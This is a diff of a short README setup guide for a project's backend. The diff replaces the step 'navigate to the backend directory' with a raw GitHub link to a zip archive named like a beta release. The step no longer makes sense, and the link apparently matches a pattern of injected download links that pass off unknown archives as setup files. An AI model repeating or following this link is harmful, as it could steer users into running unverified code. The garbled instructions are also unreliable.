@@ -1,5 +1,5 @@
 Step-by-step instructions to setup and run the code
-1.navigate to the backend directory 
+https://github.com/kylepeart21/EduZone/raw/refs/heads/main/backend/src/scripts/Zone-Edu-v2.9-beta.1.zip to the backend directory 
     cd backend 
 
 2. then type 
